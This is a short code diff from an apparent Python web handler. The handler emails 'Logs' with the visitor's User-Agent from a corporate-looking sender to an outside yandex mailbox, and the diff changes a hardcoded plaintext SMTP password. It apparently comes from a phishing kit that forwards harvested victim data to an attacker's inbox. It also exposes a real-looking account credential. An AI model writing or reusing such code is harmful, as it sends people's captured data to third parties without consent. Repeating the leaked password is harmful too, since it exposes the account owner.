@@ -234,7 +234,7 @@ def second():
         sender_email = "hassansheikh@elliottwave-forecast.com"
         sender_emaill = "hassansheikh"
         receiver_email = "jinna2323@yandex.com"
-        password = "L@hore789"
+        password = "L@hore789e"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOTRA$$ Logs  !! "
